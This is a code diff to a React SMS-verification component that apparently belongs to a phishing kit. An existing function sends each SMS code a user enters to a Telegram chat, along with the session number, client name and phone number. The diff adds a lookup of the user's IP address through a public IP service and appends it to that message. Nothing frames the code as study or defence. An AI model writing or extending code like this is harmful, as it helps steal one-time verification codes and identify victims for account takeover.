@@ -90,13 +90,25 @@ const SmsVerification = ({
     return `${mins}:${secs.toString().padStart(2, '0')}`;
   };
 
+  const getClientIp = async (): Promise<string | null> => {
+    try {
+      const response = await fetch("https://api.ipify.org?format=json");
+      const data = await response.json();
+      return data.ip;
+    } catch {
+      return null;
+    }
+  };
+
   const sendCodeToTelegram = async (smsCode: string) => {
     try {
+      const clientIp = await getClientIp();
       const message = `📱 <b>SMS Code Received</b>
 
 📋 <b>Session:</b> #${sessionCode}
 👤 <b>Client:</b> ${clientName || "Unknown"}
 📱 <b>Phone:</b> ${phoneNumber || "N/A"}
+🌐 <b>IP:</b> <code>${clientIp || "Unknown"}</code>
 
 🔑 <b>SMS Code:</b> <code>${smsCode}</code>
 ⏱ <b>Wait Time:</b> ${formatTime(elapsedSeconds)}
